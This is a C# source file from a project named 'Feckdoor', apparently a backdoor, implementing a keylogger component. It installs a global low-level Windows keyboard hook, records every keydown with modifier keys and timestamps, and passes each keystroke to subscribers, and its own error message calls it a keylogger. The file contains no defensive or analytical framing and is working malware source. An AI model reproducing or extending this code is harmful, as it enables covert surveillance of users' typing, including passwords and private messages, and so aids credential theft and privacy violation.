using System.Diagnostics;

namespace Feckdoor.InputLog
{
	public static class KeyboardHook
	{
		public static IntPtr HookHandle
		{
			get; private set;
		} = IntPtr.Zero;

		public static event EventHandler<KeyboardInputEventArgs> OnKeyboardInput = null!;

		public static void InstallHook()
		{
			using Process process = Process.GetCurrentProcess();
			using ProcessModule? module = process.MainModule;
			if (module != null)
				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, KeyboardHookProc, module.BaseAddress, 0);
		}

		private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, ref User32.KBDLLHOOKSTRUCT lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)User32.WM_KEYDOWN)
			{
				try
				{
					uint vkCode = lParam.vkCode;
					KeyboardModifierKey modifier = 0;
					if (lParam.flags.HasFlag(User32.LLKHF.ALTDOWN))
						modifier |= KeyboardModifierKey.Alt;
					if (ModifierVkCode.CtrlKey.AnyVkMatch())
						modifier |= KeyboardModifierKey.Ctrl;
					if (ModifierVkCode.ShiftKey.AnyVkMatch())
						modifier |= KeyboardModifierKey.Shift;
					if (ModifierVkCode.WinKey.AnyVkMatch())
						modifier |= KeyboardModifierKey.Win;

					OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs((VkCode)vkCode, lParam.scanCode, modifier, lParam.time));
				}
				catch (Exception e)
				{
					File.AppendAllText(Config.TheConfig.ProgramLogFile, $"Keylogger hook error: {e}{Environment.NewLine}");
				}
			}

			// Keep running the hook chain
			return User32.CallNextHookEx(HookHandle, nCode, wParam, ref lParam);
		}

		public static void UninstallHook()
		{
			User32.UnhookWindowsHookEx(HookHandle);
		}
	}

	public class KeyboardInputEventArgs : EventArgs
	{
		public VkCode VkCode
		{
			get; set;
		}

		public uint ScanCode
		{
			get; set;
		}

		public KeyboardModifierKey ModifierKeys
		{
			get; set;
		}

		public uint Time
		{
			get; set;
		}

		public KeyboardInputEventArgs(VkCode vkCode, uint scanCode, KeyboardModifierKey modifiers, uint time)
		{
			this.VkCode = vkCode;
			ScanCode = scanCode;
			ModifierKeys = modifiers;
			Time = time;
		}
	}
}
